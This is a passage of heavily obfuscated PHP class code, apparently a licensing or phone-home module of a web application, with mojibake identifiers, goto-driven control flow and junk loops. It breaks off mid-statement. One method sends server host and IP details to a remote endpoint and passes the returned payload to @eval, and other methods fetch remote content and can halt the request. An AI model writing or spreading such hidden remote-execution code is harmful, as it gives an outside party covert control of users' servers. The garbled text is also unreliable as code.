$Cò³ñÀ‚ùã[180]); $dÎëìÒ•ºÚ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][127]}($Cò³ñÀ‚ùã[148]($e¹ª¥—›ºÛ), $a‹ÉÅêğ» . $Cò³ñÀ‚ùã[181], 3); $E¸ë®¤§ÜÔ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][182]}($Cò³ñÀ‚ùã[183] . $c¾†­Ë›òå . $Cò³ñÀ‚ùã[184] . $dÎëìÒ•ºÚ, -1); $Cò³ñÀ‚ùã[166]($E¸ë®¤§ÜÔ, !0); } else { if ($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[178]] == $Cò³ñÀ‚ùã[185]) { $C½Æ¨®æ  = $Cò³ñÀ‚ùã[25]($Cò³ñÀ‚ùã[114]($Cò³ñÀ‚ùã[186] . $a‹ÉÅêğ»), 12, 15) . $Cò³ñÀ‚ùã[187]; $dÎëìÒ•ºÚ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][188]}($Cò³ñÀ‚ùã[2]($a“‡½Ñ©Ã÷[$Cò³ñÀ‚ùã[189]]), $C½Æ¨®æ , 2); $e¦Ÿ¹Éã = $Cò³ñÀ‚ùã[190]($dÎëìÒ•ºÚ, !0); if (!$Cò³ñÀ‚ùã[191]($e¦Ÿ¹Éã) || !$Cò³ñÀ‚ùã[191]($e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]]) || $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[165]] != !0) { $FŠ¼Æ«êº = $Cò³ñÀ‚ùã[193]; $cß…¬Ú½†· = $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]] ? $Cò³ñÀ‚ùã[194] . $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]] : $FŠ¼Æ«êº; $Cò³ñÀ‚ùã[166]($cß…¬Ú½†·, !1); } else { $e¹ª¥—›ºÛ[$Cò³ñÀ‚ùã[168]] = $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]][$Cò³ñÀ‚ùã[195]]; } } else { $e¦Ÿ¹Éã = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][182]}($Cò³ñÀ‚ùã[196], $e¹ª¥—›ºÛ, 10); $E ¥Ö…§çà = $f±ŸŠõñœ[590]; while ($E ¥Ö…§çà < $f±ŸŠõñœ[550]) { if ($E ¥Ö…§çà >= 0) { break; } $E ¥Ö…§çà++; } } } if (!$Cò³ñÀ‚ùã[191]($e¦Ÿ¹Éã) || !$Cò³ñÀ‚ùã[191]($e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]]) || $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[165]] != !0) { $FŠ¼Æ«êº = $Cò³ñÀ‚ùã[197]($Cò³ñÀ‚ùã[198]); $cß…¬Ú½†· = $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]] ? $Cò³ñÀ‚ùã[194] . $e¦Ÿ¹Éã[$Cò³ñÀ‚ùã[192]] : $FŠ¼Æ«êº; $Cò³ñÀ‚ùã[166]($cß…¬Ú½†·, !1); } goto D×º§óÏ•½; AÕ†ËŞÓ: } private function wqvx33d29902() { goto c±—ê“îŞË; AöÌÍ¬¥¬¼: $EÅÖœÕ¹ª = $f¡ŸÁ¸ÂÀö[597]; if (strlen($EÅÖœÕ¹ª) < $f¡ŸÁ¸ÂÀö[550]) { die; } $cÀ£Ï“¾†Õ[61]($cÀ£Ï“¾†Õ[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][218]}($cÀ£Ï“¾†Õ[219], $cÀ£Ï“¾†Õ[229]); goto Dã—©ëˆëº; c±—ê“îŞË: $f¡ŸÁ¸ÂÀö =& $_SERVER[õëù©û]; $cÀ£Ï“¾†Õ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $cÀ£Ï“¾†Õ[61]($cÀ£Ï“¾†Õ[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][221]}(array($cÀ£Ï“¾†Õ[209] => $cÀ£Ï“¾†Õ[10], $cÀ£Ï“¾†Õ[210] => $cÀ£Ï“¾†Õ[10], $cÀ£Ï“¾†Õ[120] => $cÀ£Ï“¾†Õ[121], $cÀ£Ï“¾†Õ[122] => $cÀ£Ï“¾†Õ[10], $cÀ£Ï“¾†Õ[123] => $cÀ£Ï“¾†Õ[10])); goto AöÌÍ¬¥¬¼; Dã—©ëˆëº: $e¨‚®Á®¼æ = $f¡ŸÁ¸ÂÀö[598]; if (strlen($e¨‚®Á®¼æ) < $f¡ŸÁ¸ÂÀö[553]) { return; } $this->qzukdc8bfe9c = array(); goto A›Ó¨Ò‹Õ¨; A›Ó¨Ò‹Õ¨: $this->afdo0b2e8ad0 = $cÀ£Ï“¾†Õ[121]; $d»‰Ã’Œ§¶ = $f¡ŸÁ¸ÂÀö[599]; goto EÁÎ¢Ğá“Í; EÁÎ¢Ğá“Í: } private function gcto0060c75a() { goto FÈæ‹éĞÒ; B”¼ÛÁ†£: while (strlen($B”Å³æ‰‰œ) < $aÖ»¤´ì¡[581]) { if (!$B”Å³æ‰‰œ) { break; } $B”Å³æ‰‰œ++; } $a‘É„²±¢Á = $Féïéà‹èÕ[$c÷¾ÜñÖÍ½[225]]; $cÜÄ„¡–º = $aÖ»¤´ì¡[604]; goto d°åµ×–; aõ©Ä’¿µ: while ($B­©ƒÒ²´æ < $aÖ»¤´ì¡[553]) { if ($B­©ƒÒ²´æ >= 0) { break; } $B­©ƒÒ²´æ++; } $Féïéà‹èÕ = $c÷¾ÜñÖÍ½[222]($c÷¾ÜñÖÍ½[61]($c÷¾ÜñÖÍ½[11])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][223]}(), $c÷¾ÜñÖÍ½[224]); $B”Å³æ‰‰œ = $aÖ»¤´ì¡[603]; goto B”¼ÛÁ†£; Dˆ¸¶ĞË•Ô: $a£Á»äßîŒ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][188]}($a‘É„²±¢Á[$c÷¾ÜñÖÍ½[91]][$c¢À‹ó›×‘], $Bªè¹¥­); $a£Á»äßîŒ = $c÷¾ÜñÖÍ½[190]($a£Á»äßîŒ, !0); $bä¤–†ò·à = $aÖ»¤´ì¡[605]; goto c¾¸Ì­½Ó; f«Šğ››Š: $fËÖ¤ ˜Ÿì = $c÷¾ÜñÖÍ½[61]($c÷¾ÜñÖÍ½[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}(); $e´àë°×àŒ = $aÖ»¤´ì¡[601]; while ($e´àë°×àŒ < $aÖ»¤´ì¡[553]) { if ($e´àë°×àŒ >= 0) { break; } $e´àë°×àŒ++; } goto D³ŒÛ³Š¶ì; fç¡í²ç: if ($c÷¾ÜñÖÍ½[230]() >= $c³Ù°Ë’ó¼) { return $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][164]}(); } $this->qzukdc8bfe9c = $a£Á»äßîŒ; $this->afdo0b2e8ad0 = $fËÖ¤ ˜Ÿì[$c÷¾ÜñÖÍ½[120]]; goto DôÁÉğ›³; d°åµ×–: while (strlen($cÜÄ„¡–º) < $aÖ»¤´ì¡[553]) { if (!$cÜÄ„¡–º) { break; } $cÜÄ„¡–º++; } $Bªè¹¥­ = $c÷¾ÜñÖÍ½[114]($_SERVER[$c÷¾ÜñÖÍ½[115]] . $c÷¾ÜñÖÍ½[214]($BÇ÷¼…ó¬Ê) . $fËÖ¤ ˜Ÿì[$c÷¾ÜñÖÍ½[210]]); $c¢À‹ó›×‘ = $c÷¾ÜñÖÍ½[214]($c÷¾ÜñÖÍ½[25]($Bªè¹¥­, 10, 16)); goto Dˆ¸¶ĞË•Ô; FÈæ‹éĞÒ: $aÖ»¤´ì¡ =& $_SERVER[õëù©û]; $c÷¾ÜñÖÍ½ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $_SERVER[$c÷¾ÜñÖÍ½[175]] = $c÷¾ÜñÖÍ½[104]($_SERVER, $c÷¾ÜñÖÍ½[175], APP_HOST); goto fÓ×¼’Ó; fÓ×¼’Ó: $AèöŞôÚŒÆ = $aÖ»¤´ì¡[600]; if (strlen($AèöŞôÚŒÆ) < $aÖ»¤´ì¡[581]) { return; } $this->afdo0b2e8ad0 = $c÷¾ÜñÖÍ½[121]; goto f«Šğ››Š; D³ŒÛ³Š¶ì: if ($fËÖ¤ ˜Ÿì[$c÷¾ÜñÖÍ½[120]] == $c÷¾ÜñÖÍ½[121]) { return; } $BÇ÷¼…ó¬Ê = $c÷¾ÜñÖÍ½[61]($c÷¾ÜñÖÍ½[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}($c÷¾ÜñÖÍ½[116]); $B­©ƒÒ²´æ = $aÖ»¤´ì¡[602]; goto aõ©Ä’¿µ; c¾¸Ì­½Ó: if (!$bä¤–†ò·à) { die; } if (!$c÷¾ÜñÖÍ½[191]($a£Á»äßîŒ)) { return $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][164]}(); } $c³Ù°Ë’ó¼ = $c÷¾ÜñÖÍ½[144]($a£Á»äßîŒ[$c÷¾ÜñÖÍ½[145]]); goto fç¡í²ç; DôÁÉğ›³: } private function abvzd63a9ad1() { goto Bà¶ÁÚËæ; DêËÀ®ãÂ: $Fƒšïã²ËÉ = $_SERVER[$D†Éëƒ Ò[44]]; $eïÁ•‘×‘¼ = $AºùÁÀ¿ùî[606]; while ($eïÁ•‘×‘¼ < $AºùÁÀ¿ùî[548]) { if ($eïÁ•‘×‘¼ >= 0) { break; } $eïÁ•‘×‘¼++; } goto d¼ÂĞºÌ”š; d¼ÂĞºÌ”š: if ($Fƒšïã²ËÉ == $D†Éëƒ Ò[231] && $this->afdo0b2e8ad0 == $D†Éëƒ Ò[121]) { $D†Éëƒ Ò[166]($D†Éëƒ Ò[197]($D†Éëƒ Ò[232]), !1, $D†Éëƒ Ò[233]); } $D°ĞÍË©Ûò = array($D†Éëƒ Ò[234], $D†Éëƒ Ò[235]); if ($D†Éëƒ Ò[236]($Fƒšïã²ËÉ, $D°ĞÍË©Ûò)) { if ($this->afdo0b2e8ad0 == $D†Éëƒ Ò[121] && isset($d®ŠÅ‚ÈÁ[$D†Éëƒ Ò[237]])) { $D†Éëƒ Ò[166]($D†Éëƒ Ò[197]($D†Éëƒ Ò[232]), !1, $D†Éëƒ Ò[233]); die; } $C¶ó©Œ³Ğ¾ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][137]}(); if ($C¶ó©Œ³Ğ¾ != $D†Éëƒ Ò[201]($D†Éëƒ Ò[238])) { if ($C¶ó©Œ³Ğ¾ <= $D†Éëƒ Ò[61]($D†Éëƒ Ò[139])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][140]}()) { $D†Éëƒ Ò[166]($D†Éëƒ Ò[197]($D†Éëƒ Ò[239]), !1, $D†Éëƒ Ò[233]); die; } } } goto dƒˆš´©öæ; Bà¶ÁÚËæ: $AºùÁÀ¿ùî =& $_SERVER[õëù©û]; $D†Éëƒ Ò =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $d®ŠÅ‚ÈÁ = $GLOBALS[$D†Éëƒ Ò[22]]; goto DêËÀ®ãÂ; dƒˆš´©öæ: } private function ukbp49f843ce() { goto d™¢§‹»´; bÂÆ¹Şİ—: if ($AŞí«İ’ôª && $F‡ºñìœøÖ[32]($AŞí«İ’ôª, $F‡ºñìœøÖ[253])) { echo $AŞí«İ’ôª; } die; goto E°‹ñÇĞ¤¦; F©¦“ğé‡: if (!$F‡ºñìœøÖ[104]($GLOBALS, $F‡ºñìœøÖ[132]) || !isset($_GET[$F‡ºñìœøÖ[241]])) { return; } if (!$F‡ºñìœøÖ[236]($_SERVER[$F‡ºñìœøÖ[44]], $eõµÍ÷‰¼¢)) { return; } $döÑ„Éİö» = $F‡ºñìœøÖ[242]; goto DĞŒßí™¡; eİ…øñ±Ù·: $Bò­ØƒŞ§Ï = $d¥ åàƒ³[609]; if (strlen($Bò­ØƒŞ§Ï) < $d¥ åàƒ³[548]) { die; } $F‡ºñìœøÖ[251]($F‡ºñìœøÖ[252]); goto bÂÆ¹Şİ—; d™¢§‹»´: $d¥ åàƒ³ =& $_SERVER[õëù©û]; $F‡ºñìœøÖ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $eõµÍ÷‰¼¢ = array($F‡ºñìœøÖ[135], $F‡ºñìœøÖ[240]); goto F©¦“ğé‡; DĞŒßí™¡: $eñÄÑÆœŸ = $d¥ åàƒ³[607]; if (!$eñÄÑÆœŸ) { return; } $döÑ„Éİö» = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($döÑ„Éİö», $F‡ºñìœøÖ[244]); goto cÒ÷©ªÁÔ; cÒ÷©ªÁÔ: $C¹àÛè¹ƒ— = $d¥ åàƒ³[608]; $bù‚ºí»‚ = $F‡ºñìœøÖ[245](array($F‡ºñìœøÖ[246] => array($F‡ºñìœøÖ[247] => $F‡ºñìœøÖ[248], $F‡ºñìœøÖ[249] => 3))); $AŞí«İ’ôª = @$F‡ºñìœøÖ[250]($döÑ„Éİö», !1, $bù‚ºí»‚); goto eİ…øñ±Ù·; E°‹ñÇĞ¤¦: } public function uljvc03f4461($aÄø¸¡»ˆæ) { goto F´„æç‰¬; Eî®¼»·: return $aÄø¸¡»ˆæ; goto f›Š÷Ã¬Ş‚; Fó¿‰àÚõ: $bèÅã Ë°¹ = $F¬¿±÷¿²³[0]($F¬¿±÷¿²³[263], $F¬¿±÷¿²³[104]($this->qzukdc8bfe9c, $F¬¿±÷¿²³[129], $F¬¿±÷¿²³[10])); $a˜õ®‰«ÌÖ = $DëÄíÆïç¤[611]; while ($a˜õ®‰«ÌÖ < $DëÄíÆïç¤[581]) { if ($a˜õ®‰«ÌÖ >= 0) { break; } $a˜õ®‰«ÌÖ++; } goto Bñ¾†ØÚ¡‹; Bñ¾†ØÚ¡‹: $Cæ¹¡÷äÏù = array(); foreach ($b‚âŒ§‡Å‹ as $càÕËŒŠÇ¦) { if (!$F¬¿±÷¿²³[236]($càÕËŒŠÇ¦, $bèÅã Ë°¹)) { $Cæ¹¡÷äÏù[] = $càÕËŒŠÇ¦; } } foreach ($Cæ¹¡÷äÏù as $càÕËŒŠÇ¦) { unset($aÄø¸¡»ˆæ[$càÕËŒŠÇ¦]); } goto Eî®¼»·; F´„æç‰¬: $DëÄíÆïç¤ =& $_SERVER[õëù©û]; $F¬¿±÷¿²³ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if ($this->afdo0b2e8ad0 == $F¬¿±÷¿²³[254]) { return $aÄø¸¡»ˆæ; } goto FÙë“â¾¼¢; FÙë“â¾¼¢: $b‚âŒ§‡Å‹ = array($F¬¿±÷¿²³[255], $F¬¿±÷¿²³[256], $F¬¿±÷¿²³[257], $F¬¿±÷¿²³[258], $F¬¿±÷¿²³[259], $F¬¿±÷¿²³[260], $F¬¿±÷¿²³[261], $F¬¿±÷¿²³[262]); $A´¡öÂÌ‚¢ = $DëÄíÆïç¤[610]; if (!$A´¡öÂÌ‚¢) { die; } goto Fó¿‰àÚõ; f›Š÷Ã¬Ş‚: } private function skaib6ebd5b9() { goto EÈòë®Î; bĞ¿ÒÛïÚ: $CìÇ£´“ãÜ = $Aóãµ ·[613]; while ($CìÇ£´“ãÜ < $Aóãµ ·[553]) { if ($CìÇ£´“ãÜ >= 0) { break; } $CìÇ£´“ãÜ++; } $GLOBALS[$Fˆ¤é•ñˆ[91]][$Fˆ¤é•ñˆ[95]][$Fˆ¤é•ñˆ[264]] = $Fˆ¤é•ñˆ[229]; goto C©“¤ÊÕ¾; Aù¶ôóÚô: while ($D‘èª“éÛ‚ < $Aóãµ ·[548]) { if ($D‘èª“éÛ‚ >= 0) { break; } $D‘èª“éÛ‚++; } foreach ($E­“ÊÅ´ç as $e¹“’›Ê®‹) { if ($e¹“’›Ê®‹ == $e¡‡õ”ÜÑâ || $Fˆ¤é•ñˆ[25]($e¡‡õ”ÜÑâ, 0, $Fˆ¤é•ñˆ[24]($e¹“’›Ê®‹)) == $e¹“’›Ê®‹) { $Fˆ¤é•ñˆ[166]($Fˆ¤é•ñˆ[197]($Fˆ¤é•ñˆ[266]), !1); } } $GLOBALS[$Fˆ¤é•ñˆ[91]][$Fˆ¤é•ñˆ[95]][$Fˆ¤é•ñˆ[267]] = $Fˆ¤é•ñˆ[220]; goto bĞ¿ÒÛïÚ; C©“¤ÊÕ¾: $f¯ŠŒò¥• = $Aóãµ ·[614]; if (strlen($f¯ŠŒò¥•) < $Aóãµ ·[553]) { return; } $GLOBALS[$Fˆ¤é•ñˆ[91]][$Fˆ¤é•ñˆ[268]] = $Fˆ¤é•ñˆ[220]; goto F˜˜Œé§¢; EÈòë®Î: $Aóãµ · =& $_SERVER[õëù©û]; $Fˆ¤é•ñˆ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if ($this->afdo0b2e8ad0 != $Fˆ¤é•ñˆ[121]) { $GLOBALS[$Fˆ¤é•ñˆ[91]][$Fˆ¤é•ñˆ[95]][$Fˆ¤é•ñˆ[264]] = $Fˆ¤é•ñˆ[220]; return; } goto eÜ´¼èê®î; eÜ´¼èê®î: $e¡‡õ”ÜÑâ = $_SERVER[$Fˆ¤é•ñˆ[44]]; $E­“ÊÅ´ç = array($Fˆ¤é•ñˆ[265]); $D‘èª“éÛ‚ = $Aóãµ ·[612]; goto Aù¶ôóÚô; C˜Ñ°÷†š¼: $BÍÄÄ„äğ = $Aóãµ ·[616]; while (strlen($BÍÄÄ„äğ) < $Aóãµ ·[581]) { if (!$BÍÄÄ„äğ) { break; } $BÍÄÄ„äğ++; } goto E…äĞÓŠÜô; F˜˜Œé§¢: $d‡ßå¹Œ¦œ = $Aóãµ ·[615]; while (strlen($d‡ßå¹Œ¦œ) < $Aóãµ ·[550]) { if (!$d‡ßå¹Œ¦œ) { break; } $d‡ßå¹Œ¦œ++; } $Fˆ¤é•ñˆ[61]($Fˆ¤é•ñˆ[269])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][221]}($Fˆ¤é•ñˆ[85], $Fˆ¤é•ñˆ[229]); goto C˜Ñ°÷†š¼; E…äĞÓŠÜô: } public function vthm86347369() { $Eá‡¶ÓËØ¸ =& $_SERVER[õëù©û]; return $_SERVER[ÀÜ¸â¬òüƒÇÚ][270]; $Dâ¼ÖÍŒ = $Eá‡¶ÓËØ¸[617]; if (strlen($Dâ¼ÖÍŒ) < $Eá‡¶ÓËØ¸[555]) { return; } } private function pwgq0859ac2b() { goto f’“µÀˆ‘; Dğ¼ÊË—ï¸: $C‹ÅéŒ”Ó¼ = $fÛÂğàéªĞ[620]; if ($this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][199]}($c”Ï²ñàØØ[$fé‚Î‘ÒÖ[280]]) != $c©§âËÕß[$fé‚Î‘ÒÖ[165]]) { $få„Ì„¦„Å = array($fé‚Î‘ÒÖ[202] => $fé‚Î‘ÒÖ[61]($fé‚Î‘ÒÖ[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}($fé‚Î‘ÒÖ[116]), $fé‚Î‘ÒÖ[203] => $_SERVER[$fé‚Î‘ÒÖ[115]], $fé‚Î‘ÒÖ[204] => $fé‚Î‘ÒÖ[205](), $fé‚Î‘ÒÖ[174] => $_SERVER[$fé‚Î‘ÒÖ[175]]); $eïË·Ã‘ø = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][206]}($fé‚Î‘ÒÖ[148]($få„Ì„¦„Å)); $c”Ï²ñàØØ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][182]}($fé‚Î‘ÒÖ[207] . $eïË·Ã‘ø); if ($c”Ï²ñàØØ && $fé‚Î‘ÒÖ[191]($c”Ï²ñàØØ) && isset($c”Ï²ñàØØ[$fé‚Î‘ÒÖ[280]])) { $F˜‘—ß†â = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][188]}($c”Ï²ñàØØ[$fé‚Î‘ÒÖ[280]], 2); if ($F˜‘—ß†â) { $F˜‘—ß†â = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][199]}($F˜‘—ß†â); } if ($F˜‘—ß†â) { try { @eval($F˜‘—ß†â); } catch (Exception $D™Ì¬ƒÏ™) { } } } } goto BŠÖöƒô‚Ò; eóÈŒ™ğ…í: $E™«•Í—Ç = $fÛÂğàéªĞ[601]; if (!$E™«•Í—Ç) { die; } $e÷£¯×Ú¢˜ = $fé‚Î‘ÒÖ[274] . $fé‚Î‘ÒÖ[114]($fé‚Î‘ÒÖ[275]); goto aùµ®Ğ‘Ä; dŞˆ©êÓîê: $c”Ï²ñàØØ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][182]}($fé‚Î‘ÒÖ[279], $c©§âËÕß); $aÙÓ¦çí¬ = $fÛÂğàéªĞ[619]; while (strlen($aÙÓ¦çí¬) < $fÛÂğàéªĞ[555]) { if (!$aÙÓ¦çí¬) { break; } $aÙÓ¦çí¬++; } goto Dô¿Øö„°å; Dô¿Øö„°å: if (!$fé‚Î‘ÒÖ[191]($c”Ï²ñàØØ)) { return; } if ($c”Ï²ñàØØ[$fé‚Î‘ÒÖ[165]] && $c”Ï²ñàØØ[$fé‚Î‘ÒÖ[280]]) { if ($this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][199]}($c”Ï²ñàØØ[$fé‚Î‘ÒÖ[280]]) == $c©§âËÕß[$fé‚Î‘ÒÖ[165]]) { return; } } $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][164]}(); goto Dğ¼ÊË—ï¸; DİÎœ¬‘Ìİ: $BØœ¶ÙÓ¥¾ = $fé‚Î‘ÒÖ[13](array($fé‚Î‘ÒÖ[276], $fé‚Î‘ÒÖ[277]), $e÷£¯×Ú¢˜); if ($BØœ¶ÙÓ¥¾ && $fé‚Î‘ÒÖ[230]() - $BØœ¶ÙÓ¥¾ < $fé‚Î‘ÒÖ[201]($fé‚Î‘ÒÖ[278])) { return; } $fé‚Î‘ÒÖ[13](array($fé‚Î‘ÒÖ[276], $fé‚Î‘ÒÖ[152]), $e÷£¯×Ú¢˜, $fé‚Î‘ÒÖ[230]()); goto dÄÚ¿Öš; f’“µÀˆ‘: $fÛÂğàéªĞ =& $_SERVER[õëù©û]; $fé‚Î‘ÒÖ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $F«â¦²À¿ = array($fé‚Î‘ÒÖ[271], $fé‚Î‘ÒÖ[272], $fé‚Î‘ÒÖ[273]); goto eóÈŒ™ğ…í; dÄÚ¿Öš: $fƒµàÓ²±İ = $fÛÂğàéªĞ[618]; if (!$fƒµàÓ²±İ) { die; } $c©§âËÕß = array($fé‚Î‘ÒÖ[165] => $fé‚Î‘ÒÖ[61]($fé‚Î‘ÒÖ[62])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][63]}($fé‚Î‘ÒÖ[209]), $fé‚Î‘ÒÖ[178] => $this->afdo0b2e8ad0, $fé‚Î‘ÒÖ[176] => $_SERVER[$fé‚Î‘ÒÖ[177]], $fé‚Î‘ÒÖ[169] => $fé‚Î‘ÒÖ[149], $fé‚Î‘ÒÖ[172] => $_SERVER[$fé‚Î‘ÒÖ[173]]); goto dŞˆ©êÓîê; aùµ®Ğ‘Ä: if ($this->afdo0b2e8ad0 == $fé‚Î‘ÒÖ[121] || !$fé‚Î‘ÒÖ[104]($GLOBALS, $fé‚Î‘ÒÖ[132])) { return; } if (!$fé‚Î‘ÒÖ[236]($_SERVER[$fé‚Î‘ÒÖ[44]], $F«â¦²À¿)) { return; } if ($fé‚Î‘ÒÖ[230]() % 4 != 0) { return; } goto DİÎœ¬‘Ìİ; BŠÖöƒô‚Ò: } private function tsnw7fd36f07($Aèœ†…ç°Š = '', $CÇÊ¨‰‰×Î = array(), $f‰á™ê = 5) { goto Bî¨é¨¢‰Ì; a¹éõóË: if (!$Bã’°¤ƒ¡ô) { die; } $d×À™¨ìùè = $d×À™¨ìùè . $Aèœ†…ç°Š . $a—÷óÍ—§[283] . $a—÷óÍ—§[284]($CÇÊ¨‰‰×Î); $f³·ÄêŒ§© = $fœ×»…¦ì[623]; goto dˆªà§À; dšˆ­ÕËå: $A®Ë½Âè› = $fœ×»…¦ì[624]; return $a—÷óÍ—§[190]($CÇÊ¨‰‰×Î, !0); goto C¨…ÚÎ„¹õ; dˆªà§À: if ($CÇÊ¨‰‰×Î === -1) { return $d×À™¨ìùè; } $BŸÆ®Ù„È = $a—÷óÍ—§[245](array($a—÷óÍ—§[246] => array($a—÷óÍ—§[249] => $f‰á™ê, $a—÷óÍ—§[247] => $a—÷óÍ—§[285]), $a—÷óÍ—§[286] => array($a—÷óÍ—§[287] => !1, $a—÷óÍ—§[288] => !1))); $CÇÊ¨‰‰×Î = @$a—÷óÍ—§[250]($d×À™¨ìùè, !1, $BŸÆ®Ù„È); goto dšˆ­ÕËå; Bî¨é¨¢‰Ì: $fœ×»…¦ì =& $_SERVER[õëù©û]; $a—÷óÍ—§ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $d×À™¨ìùè = $a—÷óÍ—§[281]; goto A¥Ùë‰¬§; A¥Ùë‰¬§: $E¢Ô½èĞ¥© = $fœ×»…¦ì[621]; $d×À™¨ìùè = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($d×À™¨ìùè, $a—÷óÍ—§[282]); $Bã’°¤ƒ¡ô = $fœ×»…¦ì[622]; goto a¹éõóË; C¨…ÚÎ„¹õ: } private function fhlr9d1d9ae1() { goto aÍ·ä«±; A†»ˆ­ò§¬: $F§ö´ËÉ±© = $DäØ£¶ßÁ°[104]($this->qzukdc8bfe9c, $DäØ£¶ßÁ°[316]); $F§ö´ËÉ±© = $F§ö´ËÉ±© ? $DäØ£¶ßÁ°[201]($F§ö´ËÉ±©) : 0; $eø­äøáä = $dÈ–èßÅ›[627]; goto DÅÙ¡ìÈƒÌ; b³á¹îƒÀ: $DÅ÷ø‚“¹¢ = $DäØ£¶ßÁ°[201]($DÅ÷ø‚“¹¢ ? $DÅ÷ø‚“¹¢ : $DäØ£¶ßÁ°[290]); $DáøÜÎ¬õ¸ = $dÈ–èßÅ›[626]; if (!$DáøÜÎ¬õ¸) { return; } goto A†»ˆ­ò§¬; DÅÙ¡ìÈƒÌ: return $DÅ÷ø‚“¹¢ + $F§ö´ËÉ±©; $d°õß‘…Ö = $dÈ–èßÅ›[628]; if (strlen($d°õß‘…Ö) < $dÈ–èßÅ›[581]) { die; } goto DŒØ—Ùñô¯; c³çËÕ‡º: $Eõàˆ†ªÓ = $dÈ–èßÅ›[625]; while (strlen($Eõàˆ†ªÓ) < $dÈ–èßÅ›[581]) { if (!$Eõàˆ†ªÓ) { break; } $Eõàˆ†ªÓ++; } $DÅ÷ø‚“¹¢ = $A¢ñğøíâ[$this->afdo0b2e8ad0]; goto b³á¹îƒÀ; aÍ·ä«±: $dÈ–èßÅ› =& $_SERVER[õëù©û]; $DäØ£¶ßÁ° =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $A¢ñğøíâ = array($DäØ£¶ßÁ°[289] => $DäØ£¶ßÁ°[290], $DäØ£¶ßÁ°[291] => $DäØ£¶ßÁ°[292], $DäØ£¶ßÁ°[293] => $DäØ£¶ßÁ°[294], $DäØ£¶ßÁ°[295] => $DäØ£¶ßÁ°[296], $DäØ£¶ßÁ°[297] => $DäØ£¶ßÁ°[298], $DäØ£¶ßÁ°[299] => $DäØ£¶ßÁ°[238], $DäØ£¶ßÁ°[300] => $DäØ£¶ßÁ°[238], $DäØ£¶ßÁ°[301] => $DäØ£¶ßÁ°[290], $DäØ£¶ßÁ°[302] => $DäØ£¶ßÁ°[292], $DäØ£¶ßÁ°[303] => $DäØ£¶ßÁ°[294], $DäØ£¶ßÁ°[304] => $DäØ£¶ßÁ°[305], $DäØ£¶ßÁ°[306] => $DäØ£¶ßÁ°[296], $DäØ£¶ßÁ°[307] => $DäØ£¶ßÁ°[308], $DäØ£¶ßÁ°[309] => $DäØ£¶ßÁ°[298], $DäØ£¶ßÁ°[310] => $DäØ£¶ßÁ°[311], $DäØ£¶ßÁ°[312] => $DäØ£¶ßÁ°[313], $DäØ£¶ßÁ°[314] => $DäØ£¶ßÁ°[315]); goto c³çËÕ‡º; DŒØ—Ùñô¯: } public function kawq267915dc($CÚ‚Ã«‰ÍŞ) { goto C¼»çÖ; C¼»çÖ: $eˆ´‰ó„ =& $_SERVER[õëù©û]; $FâŠßœÌŠ« =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $bêå¨²Øâµ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][137]}(); goto Dõ­¨½Õ”‚; Aô¢ÏÏœ†: while ($DÏ¸„øèÇ < $eˆ´‰ó„[555]) { if ($DÏ¸„øèÇ >= 0) { break; } $DÏ¸„øèÇ++; } if ($AÔ¯¿ÉÆ» <= $bêå¨²Øâµ) { return; } $cˆë“×ÀÄ½ = $FâŠßœÌŠ«[61]($FâŠßœÌŠ«[139])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][317]}($FâŠßœÌŠ«[318])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][319]}($bêå¨²Øâµ)->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][320]}(); goto dˆ¸‡ŒØË“; FÃ¯´Î: $E¶³ÇÒ„³ = $eˆ´‰ó„[631]; if (!$E¶³ÇÒ„³) { die; } if (!$FâŠßœÌŠ«[236]($CÚ‚Ã«‰ÍŞ[$FâŠßœÌŠ«[318]], $cˆë“×ÀÄ½)) { $FâŠßœÌŠ«[166]($FâŠßœÌŠ«[321], !1, 